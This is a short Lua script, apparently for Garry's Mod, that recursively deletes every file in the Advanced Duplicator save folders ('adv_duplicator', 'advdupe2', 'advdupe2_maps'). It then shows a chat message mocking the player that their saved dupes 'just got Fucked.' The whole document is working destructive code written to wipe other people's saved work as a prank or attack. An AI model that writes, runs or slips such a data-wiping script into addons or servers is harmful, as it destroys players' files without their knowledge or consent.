local function DeleteAllRecursive(folder)
        local files,dirs=file.Find(folder.."/*","DATA")
		PrintTable(files) PrintTable(dirs)
        for k,v in pairs(files) do
                file.Delete( folder.."/"..v )
        end
        for k,v in pairs(dirs) do
                DeleteAllRecursive(folder.."/"..v)
        end
end
 
DeleteAllRecursive("adv_duplicator")
DeleteAllRecursive("advdupe2")
DeleteAllRecursive("advdupe2_maps")
	
chat.AddText(Color(255,255,255),"Let's hope you backed up your ",Color(0,255,0),"advanced dupes. ",Color(255,255,255),"They just got ",Color(255,0,0),"Fucked.")
